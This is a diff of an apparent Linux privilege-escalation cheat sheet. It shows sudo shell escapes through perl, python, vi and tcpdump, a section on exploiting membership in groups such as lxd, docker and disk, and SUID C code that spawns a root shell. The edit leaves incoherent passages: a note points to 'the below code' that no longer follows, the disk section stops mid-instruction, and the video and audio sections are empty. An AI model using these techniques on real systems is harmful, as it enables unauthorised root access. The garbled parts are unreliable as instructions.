@@ -250,22 +250,6 @@ Overwrite `/etc/shadow` or `/etc/sudoers`
 
 `nmap`
 
-`python/perl/ruby/lua/etc`
-
-```
-sudo perl
-exec "/bin/bash";
-ctr-d
-```
-
-```
-sudo python
-import os
-os.system("/bin/bash")
-```
-
-`sh`
-
 `tcpdump`
 
 ```
@@ -276,8 +260,6 @@ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
 
 `vi/vim`
 
-Can be abused like this:
-
 ```
 sudo vi
 :shell
@@ -287,6 +269,42 @@ sudo vi
 ```
 
 [How I got root with sudo/](https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/)
+
+### Abusing Excessive Groups
+
+Often you'll find that a user has been made a member of a group that it needn't be a part of.  From this you can abuse this to either leak information or compromise the system in unintended ways.
+
+When first enumerating a group, see what it can access and what special permissions may be afforded it as so:
+
+```
+find / -group groupname 2>/dev/null
+```
+
+#### adm
+
+The admin group, adm, allows the user to view logs in `/var/log`.  Whilst this is not directly exploitable, it can be used to leak sensitive information, such as user actions, vulnerable applications and any potentially hidden cron-jobs.  
+
+#### lxd
+
+If a member of the lxd gorup, the user can use this to escalate to root, and potentially escape any containers it is a member of.  
+
+#### docker
+
+If a member of the docker group, the user can use this to escalate to root, and potentially escape the container.
+
+#### disk
+
+The disk group gives the user full access to any block devices contained within `/dev/`.  Since `/dev/sda1` will in general be the global file-system, and the disk group will have full read-write privileges to this device:
+
+```
+brw-rw---- 1 root disk 8, 1 Feb  5 13:38 /dev/sda1
+```
+
+From this we can use debugfs to enumerate the entire disk as so
+
+#### video
+
+#### audio
 
 ### World writable scripts invoked as root
 
@@ -374,36 +392,19 @@ chmod 4777 exploit
 ```c
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-int main()
-{
-    setuid(0);
-    system("/bin/bash");
-    return 0;
-}
-```
-
-Note that this type of exploit will not always work.  The above sets the uid, but upon actually executing the script, you may find that you still maintain the same privileges.  I believe that bash can drop permissions to what's known as the effective-uid to avoid suid vulnerabilities as above.  In this case, the best bet is to use the below code which just goes overboard.
-
-```c
-#include <stdio.h>
-#include <stdlib.h>
 #include <unistd.h>
 
 int main( int argc, char *argv[] )
 {
-    seteuid(1000);
-    setgid(1000);
-    setuid(1000);
     setreuid(1000, 1000);
     printf("ID: %d\n", geteuid());
     execve("/bin/sh", NULL, NULL);
 }
 ```
 
-You could also just generate 
+Note that this type of exploit will not always work.  The above sets the uid, but upon actually executing the script, you may find that you still maintain the same privileges.  I believe that bash can drop permissions to what's known as the effective-uid to avoid suid vulnerabilities as above.  In this case, the best bet is to use the below code which just goes overboard.
+
+You could also just generate a binary using msfvenom if desired.
 
 ## Steal password through a keylogger
 
